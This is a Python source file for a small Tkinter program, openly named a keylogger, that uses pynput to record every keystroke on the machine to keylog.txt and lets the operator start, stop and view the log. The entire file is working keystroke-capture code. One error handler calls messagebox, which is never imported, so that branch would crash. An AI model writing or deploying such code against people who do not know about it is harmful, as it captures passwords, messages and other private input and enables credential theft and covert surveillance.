import tkinter as tk
from tkinter import scrolledtext
import pynput.keyboard
import logging
import threading
import os

# Set up logging configuration
logging.basicConfig(filename="keylog.txt", level=logging.INFO, format='%(asctime)s: %(message)s')

class Keylogger:
    def __init__(self):
        self.listener = None
        self.running = False

    def on_press(self, key):
        try:
            logging.info(f"Key pressed: {key.char}")
        except AttributeError:
            logging.info(f"Special key pressed: {key}")

    def on_release(self, key):
        if key == pynput.keyboard.Key.esc:
            # Stop listener
            return False

    def start(self):
        if not self.running:
            self.running = True
            self.listener = pynput.keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
            self.listener.start()
            print("Keylogger started")

    def stop(self):
        if self.running:
            self.listener.stop()
            self.running = False
            print("Keylogger stopped")

class KeyloggerGUI:
    def __init__(self, root):
        self.keylogger = Keylogger()
        self.root = root
        self.root.title("Keylogger")

        # Start button
        self.start_button = tk.Button(root, text="Start", command=self.start_keylogger)
        self.start_button.pack(pady=5)

        # Stop button
        self.stop_button = tk.Button(root, text="Stop", command=self.stop_keylogger, state=tk.DISABLED)
        self.stop_button.pack(pady=5)

        # View Log button
        self.view_log_button = tk.Button(root, text="View Log", command=self.view_log)
        self.view_log_button.pack(pady=5)

    def start_keylogger(self):
        self.keylogger.start()
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)

    def stop_keylogger(self):
        self.keylogger.stop()
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

    def view_log(self):
        if os.path.exists("keylog.txt"):
            # Open log file in a new window
            log_window = tk.Toplevel(self.root)
            log_window.title("Keylog Viewer")

            # Create a scrolled text widget
            text_area = scrolledtext.ScrolledText(log_window, width=80, height=20)
            text_area.pack(padx=10, pady=10)

            # Read and display the log file
            with open("keylog.txt", "r") as file:
                content = file.read()
                text_area.insert(tk.END, content)
        else:
            messagebox.showerror("Error", "Keylog file not found.")

def main():
    root = tk.Tk()
    app = KeyloggerGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
